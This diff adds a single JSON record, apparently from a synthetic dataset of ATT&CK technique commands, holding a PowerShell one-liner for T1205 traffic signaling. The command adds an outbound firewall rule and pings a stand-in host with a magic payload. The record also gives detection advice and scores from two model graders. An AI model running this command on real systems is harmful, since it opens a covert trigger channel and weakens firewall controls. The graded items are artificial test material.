@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$buf=[Text.Encoding]::ASCII.GetBytes('MAGIC123');& netsh advfirewall firewall add rule name='ICMP-Signal-Out' dir=out action=allow protocol=icmpv4:8,any remoteip=192.0.2.10 >$null;(New-Object System.Net.NetworkInformation.Ping).Send('192.0.2.10',4000,$buf,(New-Object System.Net.NetworkInformation.PingOptions(64,$false)))|Out-Null",
+  "explanation": "Sends an ICMP Echo Request to 192.0.2.10 with a magic payload 'MAGIC123' to covertly trigger remote behavior. Ensures the ICMP Echo is allowed outbound with a netsh firewall rule. Administrator privileges may be needed if outbound ICMP is restricted.",
+  "rationale_steps": [
+    "Create a specific ICMP Echo payload that serves as a signaling token.",
+    "Allow and transmit ICMP Echo to a controlled host using Ping from PowerShell.",
+    "Detection: inspect ICMP payloads for fixed strings, monitor netsh changes permitting ICMP, and alert on frequent or irregular pings to external IPs."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-d814c3b4",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, correct separators, valid .NET Ping usage, and plausible netsh parameters with proper output redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "Sends an ICMP Echo with a magic payload consistent with traffic signaling and attempts to permit it via firewall, but adding the rule generally needs admin rights and the target IP is a documentation-only address, slightly reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T15:19:19.315617Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax for variable assignment, external command execution, .NET object creation, method calls, and command separation.",
+        "semantic_score": 4,
+        "semantic_justification": "The command effectively implements ICMP-based traffic signaling with an embedded payload as described by T1205; however, the `netsh` command to add a firewall rule requires Administrator privileges, contradicting the stated 'Privilege: None' and impacting the full operational feasibility of the 'ensures' part of the claimed intent.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2025-10-01T15:19:47.523043Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
